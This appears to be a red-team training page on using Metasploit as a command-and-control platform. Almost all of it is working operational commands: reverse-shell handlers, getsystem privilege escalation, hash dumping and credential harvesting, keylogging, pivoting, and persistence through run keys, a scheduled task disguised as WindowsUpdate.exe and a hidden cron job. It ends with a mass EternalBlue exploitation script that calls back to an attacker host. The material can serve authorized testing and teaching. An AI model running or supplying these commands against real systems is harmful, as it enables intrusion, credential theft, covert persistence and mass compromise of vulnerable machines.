---
layout: training-page
title: "Metasploit Framework — Red Team Academy"
module: "C2 Frameworks"
tags:
  - metasploit
  - meterpreter
  - c2
  - post-exploitation
page_key: "c2-metasploit"
render_with_liquid: false
---

# Metasploit Framework

## Metasploit as a C2 Platform

Beyond initial exploitation, Metasploit Framework is a full command-and-control platform. Meterpreter provides an in-memory agent with an encrypted channel, session management, pivoting, post-exploitation modules, and persistence — all from msfconsole. This page covers the C2 workflow: catching callbacks, managing sessions, running post modules, pivoting, and automating operations with resource scripts.

![Metasploit framework flow: msfconsole selects exploit module, executes against vulnerable target, opens Meterpreter session for post-exploitation](/images/c2-frameworks/metasploit-flow.svg)  
*// metasploit framework — exploit to meterpreter session*

## Multi/Handler — Catching Callbacks

Set up a listener before deploying payloads. `multi/handler` is the universal catch-all for any Meterpreter or shell payload.

```
msfconsole -q

# Set up listener:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0          # listen on all interfaces
set LPORT 4444
set ExitOnSession false    # keep handler alive for multiple connections
exploit -j                 # run as background job

# For HTTPS (more evasive):
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert /path/to/cert.pem    # optional custom cert
exploit -j

# For Linux targets:
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Stageless payloads (single blob, no second-stage pull):
set PAYLOAD windows/x64/meterpreter_reverse_tcp    # note: underscore not slash
```

## Session Management

Every incoming connection creates a session. Manage multiple sessions simultaneously — background, interact, kill, or upgrade them.

```
# List active sessions:
sessions
sessions -l            # same, verbose

# Interact with a session:
sessions -i 1          # session ID 1
sessions -i -1         # most recent session

# Background current session (from inside Meterpreter):
background
# or: Ctrl+Z

# Kill a session:
sessions -k 1
sessions -K            # kill all sessions

# Upgrade a basic shell to Meterpreter:
sessions -u 1          # attempt upgrade on session 1

# Run a command on all sessions:
sessions -c "sysinfo" -i 1,2,3

# Run post module on specific session:
sessions -s post/windows/gather/enum_logged_on_users -i 1
```

## Meterpreter — Core Commands

Once you have a Meterpreter session, these are the first commands to run for situational awareness and privilege escalation.

```
# System information:
sysinfo            # hostname, OS version, architecture, domain
getuid             # current user context
getpid             # PID of Meterpreter process

# Privilege escalation:
getsystem          # attempt local privesc (named pipe, token, service)
# Output: ...got system via technique 1 (Named Pipe Impersonation)

# Check current privileges:
getprivs           # list enabled privileges

# Process management:
ps                 # list all processes with PID, user, path
migrate 1234       # migrate to PID 1234 (survives payload process death)
# Tip: migrate to a stable SYSTEM process like svchost.exe

# Credential dumping (requires SYSTEM):
hashdump           # dump SAM hashes (local accounts)
run post/windows/gather/credentials/credential_collector

# File system:
pwd                # current directory
ls                 # list files
cd C:\\Users\\Administrator
download "C:\\Users\\Administrator\\secret.txt" /tmp/
upload /tmp/tool.exe "C:\\Users\\Public\\tool.exe"

# Networking:
ipconfig           # network interfaces
arp                # ARP table
route              # routing table
portfwd add -l 3389 -p 3389 -r 10.10.10.5    # local port forward

# Shell access:
shell              # drop to OS shell (cmd.exe / bash)
# Return to Meterpreter: exit
```

## Post-Exploitation Modules

Metasploit's post modules automate common post-exploitation tasks — enumeration, credential harvesting, persistence — without manual commands.

```
# From inside a Meterpreter session, run post module:
run post/multi/recon/local_exploit_suggester    # privesc suggestions
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_applications
run post/windows/gather/enum_unattend           # unattend.xml password search
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump          # domain + local hashes

# From msfconsole (set SESSION):
use post/windows/gather/enum_domain
set SESSION 1
run

use post/multi/manage/shell_to_meterpreter
set SESSION 2
run

# Keylogger:
run post/windows/capture/keylog_recorder        # logs to local file
# or in Meterpreter directly:
keyscan_start
# ... wait ...
keyscan_dump
keyscan_stop

# Screenshot:
screenshot         # takes desktop screenshot, saves locally
```

## Pivoting — Route and SOCKS Proxy

Pivot through a compromised host to reach internal subnets not directly accessible from the attacker machine. Metasploit's autoroute and socks proxy modules handle this transparently.

```
# Method 1: autoroute (route traffic for a subnet through a session)
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0/24
run

# Or directly in Meterpreter:
run autoroute -s 10.10.10.0/24
run autoroute -p                    # print current routes

# Via msfconsole:
route add 10.10.10.0/24 1           # add route via session 1
route print

# Method 2: SOCKS proxy (routes any proxychains-compatible tool)
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j                              # run as background job

# Configure /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Now use proxychains with any tool:
proxychains nmap -sV -p 445,3389 10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u Administrator -H NTLMHASH
proxychains impacket-psexec DOMAIN/Administrator:PASSWORD@10.10.10.5
```

## Persistence Modules

Establish persistence through Metasploit's post modules — they handle payload delivery, service creation, and run key registration automatically.

```
# Windows persistence via registry run key:
use post/windows/manage/persistence
set SESSION 1
set STARTUP REGISTRY    # or SCHEDULER, SERVICE
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER
set LPORT 4444
run

# Windows persistence via scheduled task:
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SCHEDULER
set EXE_NAME WindowsUpdate.exe
run

# Linux persistence via cron:
use post/linux/manage/cron_persistence
set SESSION 1
set CRON_ENTRY "* * * * * /tmp/.update"
run
```

## Database Workflow

Metasploit's PostgreSQL database tracks hosts, services, vulnerabilities, and credentials discovered during an engagement. Use it to keep findings organized across long operations.

```
# Start PostgreSQL and connect (Kali):
sudo systemctl start postgresql
msfdb init
msfconsole

# Check database status:
db_status

# Workspace management:
workspace                    # list workspaces
workspace -a client_eng      # create workspace
workspace client_eng         # switch to workspace

# View discovered hosts/services (populated by scans):
hosts
services
vulns
creds
loot

# Import Nmap scan results directly:
db_nmap -sV -p- 10.10.10.0/24
# Or import existing XML:
db_import /tmp/nmap_scan.xml

# Export workspace data:
db_export -f xml /tmp/engagement_data.xml
```

## Resource Scripts — Automation

Resource scripts (.rc files) automate repetitive msfconsole tasks. Write a sequence of commands to a file and execute it at startup or on demand.

```
># Create a resource script for a persistent listener:
cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

# Run at msfconsole startup:
msfconsole -r /tmp/handler.rc

# Run from inside msfconsole:
resource /tmp/handler.rc

# Mass exploitation script example:
cat > /tmp/mass_exploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER
set LPORT 4444
set RHOSTS file:/tmp/targets.txt
set THREADS 10
run -j
EOF
msfconsole -r /tmp/mass_exploit.rc
```
